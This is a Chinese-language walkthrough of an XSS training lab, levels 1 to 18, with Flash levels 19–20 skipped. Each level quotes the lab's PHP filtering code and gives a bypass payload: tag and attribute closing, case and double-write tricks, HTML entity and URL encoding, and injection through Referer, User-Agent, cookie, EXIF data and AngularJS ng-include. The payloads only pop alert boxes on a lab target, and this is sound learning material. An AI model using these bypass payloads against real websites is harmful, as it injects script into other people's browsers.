# XSS挑战-WalkThrough

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**知识点**
- 无过滤 XSS (level 1)
- 各种难度的构造闭合 XSS (level 2、3、4、5、6)
- 各种难度的绕过过滤 XSS (level 2、3、4、5、6)
- 双写拼接 XSS (level 7)
- 实体编码+HTML 编码 XSS (level 8、9)
- input 中的 XSS (level 10)
- HTTP headers 头中的 XSS (level 11、12、13)
- exif XSS (level 14)
- angularjs XSS (level 15)
- URL 编码 XSS (level 16)
- embed 标签的 XSS (level 17、18)
- Flash XSS (level 19、20)

---

# level 1

没什么过滤,直接使用 `<script>alert(123)</script>` 即可

payload: `http://<靶机IP>/level1.php?keyword=test<script>alert(123)</script>`

---

# level 2

![images](../../../../../assets/img/安全/实验/Web/靶场/XSS/1.png)

使用 `">` 构造输入框的闭合

payload: `test"><script>alert(123)</script>`

---

# level 3

使用 `'` 可以闭合

![images](../../../../../assets/img/安全/实验/Web/靶场/XSS/2.png)

构造 input 的 XSS,例如: `<input value=xss onfocus=alert(1) autofocus>`

payload: `test'onmouseover='alert(1)'`
payload: `test'onfocus='alert(1)' autofocus '`

---

# level 4

```php
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
```

发现过滤了 `<`、`>`,使用 `"` 可以闭合

测试一下 `test"123`

![images](../../../../../assets/img/安全/实验/Web/靶场/XSS/3.png)

构造 input 的 XSS,例如: `<input value=xss onfocus=alert(1) autofocus>`

payload: `test"onfocus=alert(1) autofocus "`

---

# level 5

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

这一关主要过滤了 `<script` 和 `on`

使用 `">` 闭合,然后使用一个不被过滤的payload `<a href=javascript:alert(19)>M`

payload: `"><a href=javascript:alert(19)>M`

---

# level 6

```php
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

和上一关一样,过滤的变多了,`href`,`data`,`src` 也被过滤,但是并没有将其大小写检测

一样,使用 `">` 闭合,然后使用一个不被过滤的payload `<ScRiPt>alert(123)</ScRiPt>`

payload: `"><ScRiPt>alert(123)</ScRiPt>`

---

# level 7

```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

这一关,只要检测到 `on`,`href`,`src`,`script` 等关键字,会直接过滤成空

闭合,然后双写,让他正好构造出 script

payload: `"><scrscriptipt>alert("1")</scrscriptipt>`

---

# level 8

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```
```php
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
```

这一关目的将 payload 写入 `<a>` 的 herf 中

尝试构造 payload `<a href=javascript:alert(1)>`,其中 script 会被转成 scr_ipt

这里可以将 r 实体编号为 `&#114;`,然后触发 HTML 解码,将 `sc&#114;ipt` 解码为 `script`

payload: `javasc&#114;ipt:alert(1)`

---

# level 9

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```
```php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有!">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
```

过滤和上一关一样,但判断是否有 `http://`

测试 `javascript:alert("http://")`,将其实体编码,构造 `javasc&#114;ipt:alert(&#34;http://&#34;)`

---

# level 10

```php
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
```
```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
```

页面中存在3个隐藏的 input 输入框,其中 t_sort 是传参的,直接在前端修改代码让他显示出来,输入 payload,构造一个 input 的 xss: `<input value=xss onfocus=alert(1) autofocus>`

payload: `test"onfocus=alert(1) autofocus type="text"`

---

# level 11

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
```
```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
```

这里的 t_ref 的 value 是我们访问这个网页的 referer 值,直接抓包修改 referer

payload: `referer:test"onfocus=alert(1) autofocus type="text"`

---

# level 12

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
```
```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
```

与上一题一样,这一题是判断 HTTP_USER_AGENT,直接抓包修改 HTTP_USER_AGENT

payload: `HTTP_USER_AGENT:test"onfocus=alert(1) autofocus type="text"`

---

# level 13

```php
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
```
```php
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
```

这一题是 cookie 中的参数 user 传入导致 XSS,抓包修改 cookie

payload: `user=test"onfocus=alert(1) autofocus type="text"`

---

# level 14

这一关的大体思路是在网页中嵌入了 http://www.exifviewer.org/ 这个网站,而这个第三方网站的作用是用于查看图片的 EXIF 信息,所以思路就是通过修改图片的 exif 信息,造成解析图片 exif 造成 XSS

我做的时候这个网站貌似无法访问了,所以这里找了另外一个网站 https://exifshot.com/app/

工具使用 [exiftool](https://exiftool.org/)

payload: `exiftool(-k).exe -artist="<details open OntogGle="alert(1)">" 1.jpg`

![images](../../../../../assets/img/安全/实验/Web/靶场/XSS/5.png)

---

# level 15

这关使用 angularjs 的 ng-include

**AngularJS ng-include 指令**

ng-include 指令用于包含外部的 HTML 文件.包含的内容将作为指定元素的子节点.

ng-include 属性的值可以是一个表达式,返回一个文件名.默认情况下,包含的文件需要包含在同一个域名下.

可以认为是文件包含

直接在包含的页面里用 &lt;script&gt; 触发不了,用了 img 标签.

遵循 SOP,调用第一关代码.使用单引号包裹,否则变成注释.

payload: `?src='level1.php?name=test<img src=1 onerror=alert(1)>'`

---

# level 16

```php
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
```

这一关过滤了空格,/ 等连接符,用 URL 编码绕过过滤

payload: `%3Cimg%0dsrc=1%0donerror=alert(2)%3E`

---

# level 17

```php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

这一关将 arg01 和 arg02 的参数分别写入 src 的值中,并过滤了尖括号,导致不能闭合标签.

在 embed 标签中尝试在 arg02 写入事件来触发 XSS.

payload: `arg01=a&arg02=%20onmousedown=alert(1)`

如果一直无法触发,可能是因为无法加载 swf 文件,建议可以换360浏览器做这一题

---

# level 18

```php
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```

这一题我看代码好像没啥区别? 使用了上一关的 payload 正常弹出 `arg01=a&arg02=%20onmousedown=alert(1)`

.......是我姿势不对吗?

网上有人构造 arg01 造成的弹出,相应的 payload: `arg01=a%20onmousedown=alert(2)&arg02=b`,我试了一下我这也能弹🤔

```
arg01=a&arg02=b onmouseout=alert(1)
arg01=a&arg02=b onmouseout=alert`1`
arg01=a&arg02=b onmouseover=alert`1`
```

---

# level 19~20

以下2关都属于 Flash XSS,对于这个不了解,略
